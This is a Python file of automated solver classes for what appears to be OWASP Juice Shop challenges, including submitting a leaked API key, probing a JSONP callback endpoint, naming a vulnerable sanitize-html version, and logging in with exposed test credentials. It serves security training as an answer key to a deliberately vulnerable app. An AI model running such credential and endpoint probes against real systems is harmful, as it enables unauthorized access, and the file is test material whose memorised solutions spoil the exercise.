from core.base_solver import BaseSolver
from loguru import logger

class LeakedApiKeySolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "leakedApiKeyChallenge"

    def solve(self) -> bool:
        # Key: 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie
        payload = {
            "comment": "Found your key: 6PPi37DBxP4lDwlriuaxP15HaDJpsUXY5TspVmie",
            "rating": 1
        }
        res = self.client.post("/api/Feedbacks", json=payload)
        return res.status_code == 201

class EmailLeakSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "emailLeakChallenge"

    def solve(self) -> bool:
        # Triggered by query param callback
        self.client.get("/rest/user/whoami?callback=alert")
        return True

class KnownVulnerableComponentSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "knownVulnerableComponentChallenge"

    def solve(self) -> bool:
        # sanitize-html 1.4.2 is a known vulnerable component
        payload = {
            "comment": "I am using sanitize-html 1.4.2",
            "rating": 1
        }
        res = self.client.post("/api/Feedbacks", json=payload)
        return res.status_code == 201

class ExposedCredentialsSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "exposedCredentialsChallenge"

    def solve(self) -> bool:
        # testing / IamUsedForTesting
        payload = {
            "email": "testing@juice-sh.op",
            "password": "IamUsedForTesting"
        }
        res = self.client.post("/rest/user/login", json=payload)
        return res.status_code == 200
